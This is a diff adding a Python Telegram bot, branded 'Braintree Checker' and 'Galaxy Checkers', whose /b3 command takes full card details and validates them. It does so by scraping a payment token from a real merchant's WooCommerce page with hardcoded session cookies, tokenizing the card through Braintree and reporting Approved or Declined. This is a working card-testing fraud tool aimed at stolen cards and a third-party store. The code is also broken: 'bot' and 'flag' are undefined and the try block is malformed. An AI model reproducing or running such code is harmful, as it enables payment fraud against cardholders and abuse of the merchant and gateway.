@@ -1,0 +1,190 @@
+import requests
+import re
+import time
+import base64
+from bs4 import BeautifulSoup
+from user_agent import generate_user_agent
+from telebot import TeleBot
+
+# Function to get BIN details
+def get_bin_info(bin_number):
+    try:
+        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
+        if response.status_code == 200:
+            data = response.json()
+            bank = data.get("bank", {}).get("name", "Unknown Bank")
+            card_type = data.get("type", "Unknown").capitalize()
+            country = data.get("country", {}).get("name", "Unknown Country")
+            country_emoji = data.get("country", {}).get("emoji", "🌍")
+            return bank, card_type, country, country_emoji
+        else:
+            return "Unknown Bank", "Unknown", "Unknown Country", "🌍"
+    except:
+        return "Unknown Bank", "Unknown", "Unknown Country", "🌍"
+
+# Command handler for /b3
+@bot.message_handler(commands=["b3"])
+def check_card(message):
+    msg = bot.reply_to(message, "🔍 Checking your card, please wait...")
+
+    try:
+        card_details = message.text.split()[1]
+        n, mm, yy, cvc = card_details.split("|")
+
+        if "20" not in yy:
+            yy = f"20{yy}"
+        if len(mm) == 1:
+            mm = f"0{mm}"
+
+        user_agent = generate_user_agent()
+
+        # Fetch BIN details
+        bin_info = get_bin_info(n[:6])
+        bank_name, card_type, country_name, country_flag = bin_info
+
+        cookies = {
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-03-11%2013%3A28%3A33',
+            'sbjs_first_add': 'fd%3D2025-03-11%2013%3A28%3A33',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29',
+            'cf_clearance': 'Th2Aog2nT4TDGRTbcWP9w3Dz7EFRWedPvO7TC6LNeB4-1741699715',
+            'wordpress_logged_in_b444e0f1bbb883efdac80935bdd84199': 'salokk%7C1742909339',
+            'wfwaf-authcookie-98378724241a3d95191bebf32899230c': '100676%7Cother%7Cread',
+            'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
+        }
+
+        headers = {
+            'authority': 'glasshousesupply.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://glasshousesupply.com',
+            'referer': 'https://glasshousesupply.com/my-account/add-payment-method/',
+            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': user_agent,
+        }
+
+        response = requests.get(
+            "https://glasshousesupply.com/my-account/add-payment-method/",
+            cookies=cookies,
+            headers=headers,
+        )
+
+        i0 = response.text.find('wc_braintree_client_token = ["')
+        i1 = response.text.find('"]', i0)
+        encoded_text = response.text[i0 + 30 : i1]
+        decoded_text = base64.b64decode(encoded_text).decode("utf-8")
+
+        au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)[0]
+
+        headers_braintree = headers.copy()
+        headers_braintree.update({
+            "authorization": f"Bearer {au}",
+            "braintree-version": "2018-05-10",
+            "content-type": "application/json",
+            "origin": "https://assets.braintreegateway.com",
+        })
+
+        json_data = {
+            "query": """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
+                tokenizeCreditCard(input: $input) {
+                    token
+                    creditCard {
+                        bin brandCode last4 expirationMonth expirationYear
+                        binData { prepaid debit issuingBank countryOfIssuance }
+                    }
+                }
+            }""",
+            "variables": {
+                "input": {
+                    "creditCard": {
+                        "number": n,
+                        "expirationMonth": mm,
+                        "expirationYear": yy,
+                        "cvv": cvc,
+                        "billingAddress": {"postalCode": "90001", "streetAddress": "Avocado Ave"},
+                    },
+                    "options": {"validate": False},
+                },
+            },
+        }
+
+        response = requests.post(
+            "https://payments.braintree-api.com/graphql",
+            headers=headers_braintree,
+            json=json_data,
+        )
+
+        if "token" not in response.text:
+            bot.edit_message_text("⚠️ Invalid response from Braintree!", message.chat.id, msg.message_id)
+            return
+
+        tok = response.json()["data"]["tokenizeCreditCard"]["token"]
+
+        data = {
+            'payment_method': 'braintree_cc',
+            'braintree_cc_nonce_key': tok,
+            'braintree_cc_device_data': '{"device_session_id":"f3b62b2059128666273f76de659fb76e","fraud_merchant_id":null,"correlation_id":"e9be3974-e5c7-45b9-b04f-89b98060"}',
+            'braintree_cc_3ds_nonce_key': '',
+            'braintree_cc_config_data': decoded_text,
+            'woocommerce-add-payment-method-nonce': 'ba76a0b9ff',
+            '_wp_http_referer': '/my-account/add-payment-method/',
+            'woocommerce_add_payment_method': '1',
+        }
+
+        response = requests.post(
+            "https://glasshousesupply.com/my-account/add-payment-method/",
+            cookies=cookies,
+            headers=headers,
+            data=data,
+        )
+
+        soup = BeautifulSoup(response.text, "html.parser")
+        error_msg = soup.find("ul", class_="woocommerce-error")
+
+        if error_msg:
+            error_text = error_msg.text.strip()
+            if "Declined" in error_text:
+                status = "❌ Declined"
+            elif "No Account" in error_text:
+                status = "⚠️ No Account"
+            elif "Processor Declined" in error_text:
+                status = "🚫 Processor Declined"
+            else:
+                status = "❌ Unknown Decline"
+        else:
+            status = "✅ Approved"
+
+        response_text = f"""
+╭─━━━━━━━━━━━━━━━━━━━─╮
+    🎩 𝘽𝙍𝘼𝙄𝙉𝙏𝙍𝙀𝙀 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 🎩
+╰─━━━━━━━━━━━━━━━━━━━─╯
+
+📌 **Card:** `{n}|{mm}|{yy}|{cvc}`
+📌 **Status:** {status}
+📌 **Gateway:** `Braintree Auth`
+📌 **BIN:** `{tok[:6]}`
+📌 **Bank:** `{bank_name}` 
+📌 **Type:** `{card_type}`
+📌 **Country:** `{country_name} {flag}`
+📌 **Checked By:** `@{message.from_user.username}`
+📌 **Response Time:** `{round(time.time() - message.date, 2)}s`
+
+╭─━━━━━━━━━━━━━━━─╮
+ 🔥 𝐆𝐀𝐋𝐀𝐗𝐘 𝐂𝐇𝐄𝐂𝐊𝐄𝐑𝐒 🔥
+╰─━━━━━━━━━━━━━━━─╯
+"""
+
+bot.edit_message_text(response_text, message.chat.id, msg.message_id, parse_mode="Markdown")
+
+bot.polling()
